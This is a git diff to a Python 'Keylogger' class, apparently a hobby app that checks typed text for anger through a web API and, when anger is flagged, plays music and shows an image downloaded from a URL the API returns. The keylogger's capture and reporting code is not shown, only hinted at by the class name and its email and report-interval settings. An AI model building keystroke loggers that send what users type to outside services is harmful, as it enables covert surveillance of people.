@@ -13,6 +13,9 @@ import requests
 import json
 import subprocess
 from subprocess import PIPE
+import io
+import urllib
+import urllib.request as req
 
 SEND_REPORT_EVERY = 1000 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "email@provider.tld"
@@ -162,33 +165,39 @@ class Keylogger:
         json_dict = json.loads(r.text)
         print('json_dict:{}'.format(type(json_dict)))
         print(json_dict['angerFlag'])
+        print(json_dict["image"])
         print("APIコール完了")
         if (json_dict["angerFlag"]):
             proc = subprocess.Popen(['python', 'music.py'], stdout=PIPE, stderr=PIPE)
-            self.showCat()
+            self.showCat(json_dict["image"])
             proc.kill()
         self.log = ""
 
-    def showCat(self):
-        url = "https://cataas.com/cat/says/hello%20world"
-        r = requests.get(url)
+    def showCat(self, imageUrl):
+        print("IMAGEURL:" + imageUrl)
+        fireName = 'test.png'
+        opener=urllib.request.build_opener()
+        opener.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1941.0 Safari/537.36')]
+        urllib.request.install_opener(opener)
+        req.urlretrieve(imageUrl, fireName)
         # print(r.content)
-        imageURL = 'inu.png'
-        # im = cv2.imread(imageURL)
-        # img = Image.open(open(imageURL, 'rb'))
-        # height, width, channel = im.shape
+        im = cv2.imread(fireName)
+        img = Image.open(open(fireName, 'rb'))
+        height, width, channel = im.shape
+        print("height:" + str(height))
+        print("width:" + str(width))
         # 画面作成
         version = tkinter.Tcl().eval('info patchlevel')
         window = tkinter.Tk()
-        # window.geometry(str(height) + "x" + str(width))
-        window.geometry("200x200")
+        window.geometry(str(width) + "x" + str(height))
+        # window.geometry("200x200")
         window.title("画像表示：" + version)    
         # キャンバス作成
-        canvas = tkinter.Canvas(window, bg="#deb887", height=200, width=200)
+        canvas = tkinter.Canvas(window, bg="#deb887", height=height, width=width)
         # キャンバス表示
         canvas.place(x=0, y=0)    
         # イメージ作成
-        img = tkinter.PhotoImage(file=imageURL, width=200, height=200)
+        img = ImageTk.PhotoImage(file="test.png", width=width, height=height, format='png')
         # キャンバスにイメージを表示
         canvas.create_image(0, 0, image=img, anchor=tkinter.NW)    
         window.mainloop()
